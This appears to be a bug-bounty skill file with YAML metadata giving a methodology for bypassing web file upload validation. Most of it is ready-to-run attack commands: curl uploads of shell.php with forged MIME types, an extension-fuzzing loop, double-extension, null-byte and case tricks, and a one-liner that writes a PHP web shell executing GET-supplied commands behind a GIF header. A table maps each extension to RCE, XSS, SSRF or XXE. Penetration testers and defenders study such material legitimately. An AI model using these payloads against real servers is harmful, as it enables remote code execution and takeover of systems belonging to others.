---
name: attack-file-upload
description: "File upload bypass — client/MIME/header validation evasion, extension fuzzing, and RCE via polyglot"
category: "input-validation"
version: "1.0"
author: "bountyreper-official"
tags:
  - file-upload
  - rce
  - xss
  - bypass
tech_stack:
  - web
  - php
cwe_ids:
  - CWE-434
  - CWE-122
chains_with:
  - attack-ssrf
  - wstg-injection
prerequisites: []
---

# File Upload Bypass

## Objective

Bypass file upload validations (client-side, extension blacklist/whitelist, MIME, content-length, image header) to achieve RCE, XSS, or SSRF.

> **Attribution:** Methodology from [KathanP19/HowToHunt — File_Upload](https://github.com/KathanP19/HowToHunt/tree/master/File_Upload) (614 lines). Licensed GPL-3.0.

## Testing Methodology

### 1. Client-Side Bypass

```bash
# Intercept and change extension/MIME
curl -X POST https://target.com/upload -F "file=@shell.php;type=image/jpeg" -F "filename=shell.php"
# Or disable JS validation in browser devtools
```

### 2. Extension Bypass

```bash
# Blacklist bypass (php blocked, try php5, phtml, phar, php3, shtml)
for ext in php5 phtml phar php3 shtml svg; do curl -F "file=@shell.$ext" https://target.com/upload; done
# Whitelist bypass (jpg allowed)
# Double extension
curl -F "file=@shell.jpg.php" https://target.com/upload
# Null byte (older PHP)
curl -F "file=@shell.php%00.jpg" https://target.com/upload
# Case variation
curl -F "file=@shell.PHP" https://target.com/upload
```

### 3. MIME Bypass

```bash
curl -F "file=@shell.php;type=image/png" https://target.com/upload
# Change Content-Type to image/jpeg while keeping .php extension
```

### 4. Image Header Bypass (magic bytes)

```bash
# Prepend GIF header to PHP shell
echo -e "GIF89a\n<?php system(\$_GET['cmd']); ?>" > shell.gif.php
# Or PNG header
printf "\x89PNG\r\n\x1a\n" | cat - shell.php > shell.png.php
```

### 5. Impact by Extension

| Ext | Impact |
|-----|--------|
| php/php5/phtml | RCE |
| svg | XSS, SSRF, XXE |
| zip | RCE via LFI, DoS |
| xml | XXE |
| csv | CSV injection |

## References

- [HowToHunt — File Upload](https://github.com/KathanP19/HowToHunt/tree/master/File_Upload)
